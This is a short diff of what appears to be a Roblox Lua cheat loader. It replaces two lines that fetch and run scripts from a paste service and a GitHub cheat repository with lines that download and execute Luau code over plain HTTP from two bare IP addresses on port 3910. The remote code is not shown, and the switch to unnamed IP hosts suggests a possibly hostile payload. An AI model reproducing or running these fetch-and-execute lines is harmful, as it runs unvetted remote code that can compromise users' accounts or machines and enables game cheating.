@@ -1,2 +1,4 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/XPbFORYrg2ufvQmi/raw", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
+ID="81f9d306-5e88-4460-aaef-e587814f677d";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
